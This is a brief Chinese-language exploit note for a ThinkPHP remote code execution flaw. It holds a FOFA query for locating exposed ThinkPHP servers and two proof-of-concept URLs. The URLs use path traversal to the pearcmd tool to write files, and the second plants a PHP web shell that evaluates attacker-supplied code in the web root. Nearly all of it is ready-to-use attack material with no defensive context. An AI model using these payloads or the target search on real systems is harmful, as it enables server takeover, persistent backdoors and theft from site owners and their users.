# ThinkPHP RCE
## 资产收集
fofa：`header="thinkphp"`
## POC
`http://172.17.0.2/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/hello.php`
`?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['ant']);?>+/var/www/html/ant.php`